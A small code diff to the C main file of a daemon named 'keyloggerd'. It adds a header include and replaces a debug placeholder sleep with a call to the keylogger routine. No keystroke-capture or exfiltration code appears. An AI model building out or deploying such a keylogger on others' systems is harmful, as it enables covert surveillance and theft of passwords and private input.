@@ -10,6 +10,7 @@
 
 #include "common.h"
 #include "error.h"
+#include "keyloggerd.h"
 
 /* @todo set to /var/run/keyloggerd.pid when super user support is added */
 #define LOCKFILE "keyloggerd.pid"
@@ -183,10 +184,7 @@ int main(int argc, char *argv[])
         err_quit("Daemon is already running");
     }
 
-#if DEBUG
-    /* Dummy process so that I can test the daemon */
-    sleep(60);
-#endif
+    keyloggerd();
 
     klog.info("Daemon finished");
 
